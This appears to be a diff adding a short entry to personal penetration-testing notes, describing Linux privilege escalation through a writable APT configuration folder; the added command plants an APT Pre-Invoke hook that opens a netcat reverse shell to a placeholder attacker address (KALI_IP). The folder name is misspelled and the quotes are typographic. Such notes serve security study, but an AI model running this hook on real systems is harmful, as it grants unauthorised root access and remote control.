@@ -1115,3 +1115,11 @@ rule CaseInsensitiveTextExample
         $text_string
 }
 ```
+
+[apt.conf.d: privilege escalation]
+* if the folder /etc/apt/apt.cond.d is writable
+* then create a random file in the folder with the following content
+```
+echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f”};’ > pwn
+```
+* https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
